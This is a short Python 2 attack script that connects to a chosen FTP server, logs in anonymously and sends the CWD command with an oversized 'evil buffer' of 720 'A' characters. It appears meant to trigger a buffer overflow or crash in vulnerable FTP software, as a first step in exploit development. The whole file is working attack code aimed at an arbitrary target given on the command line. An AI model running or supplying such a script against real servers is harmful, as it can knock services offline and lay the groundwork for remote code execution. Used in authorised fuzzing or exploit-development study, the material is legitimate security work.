#! /usr/bin/python
# Name: Rio Atmadja
# Script: send evil buffer using cwd command

import socket 
import sys 

#send evil buffer using cwd command
def fuzz_cwd(hostname): 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	evil_buffer = '\x41' * 720 

	print "\n Fuzzing ......."
	s.connect((hostname,21))

	#send user name to the server 
	data = s.recv(2000)
	s.send('user ftp' + '\r\n')
	
	#send password to the server 
	data = s.recv(2000)
	s.send('pass ftp' + '\r\n')

	#send the evil buffer along with cwd command
	data = s.recv(2000)
	s.send('CWD' + ' ' +  evil_buffer + '\r\n')

if __name__ == '__main__':
	try:
		target = sys.argv[1]
	except IndexError:
		print 'Usage: %s <target>' % sys.argv[0]
		sys.exit(-1)
	
	fuzz_cwd(target)

